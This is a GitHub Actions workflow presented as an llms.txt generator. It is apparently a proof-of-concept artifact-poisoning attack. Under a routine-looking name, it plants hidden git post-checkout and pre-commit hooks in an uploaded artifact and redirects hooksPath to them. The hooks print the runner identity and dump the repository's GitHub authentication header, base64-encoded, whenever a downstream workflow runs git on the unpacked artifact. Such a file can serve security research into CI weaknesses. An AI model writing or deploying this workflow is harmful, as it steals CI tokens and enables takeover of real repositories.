---
name: Generate llms.txt
on:
  pull_request:
    branches: [main]

jobs:
  gen:
    runs-on: ubuntu-latest
    steps:
      - name: make artifact
        run: |
          mkdir -p out/src/pages out/.git/hooks
          echo "external attacker llms.txt" > out/src/pages/llms.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          echo "main" > out/pr-branch.txt
          cat > out/.git/hooks/post-checkout <<'HOOK'
          #!/bin/sh
          echo "===== LLMS-HOOK-RAN ====="
          id
          echo "---cred---"
          git config --local --get http.https://github.com/.extraheader | base64 -w0
          echo
          echo "---endcred---"
          echo "===== LLMS-HOOK-END ====="
          HOOK
          chmod +x out/.git/hooks/post-checkout
          cp out/.git/hooks/post-checkout out/.git/hooks/pre-commit
          git init -q out/.git 2>/dev/null || true
          printf '[core]\n\thooksPath = .git/hooks\n' > out/.git/config
      - uses: actions/upload-artifact@v4
        with:
          name: llms-txt
          path: out/
          include-hidden-files: true
